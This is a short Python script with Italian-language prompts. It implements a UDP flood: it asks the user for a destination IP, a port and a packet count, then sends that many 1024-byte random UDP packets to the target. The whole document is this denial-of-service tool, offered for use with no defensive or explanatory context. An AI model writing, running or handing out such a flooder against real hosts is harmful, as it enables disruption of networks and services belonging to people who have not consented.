import socket
import random

def udp_flood():
    packets = random._urandom(1024)

    for x in range(num):
            s.sendto(packets, target)
            print("#", x, "pacchetti inviati")

destination = input("Inserisci l'IP di destinazione: ")
port = int(input("Inserisci la porta di destinazione: "))
num = int(input("Inserisci il numero di pacchetti da inviare:"))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target = (destination, port)
except Exception as e:
    print("Errore nella creazione del socket:", e)
    s.close()
    exit

udp_flood()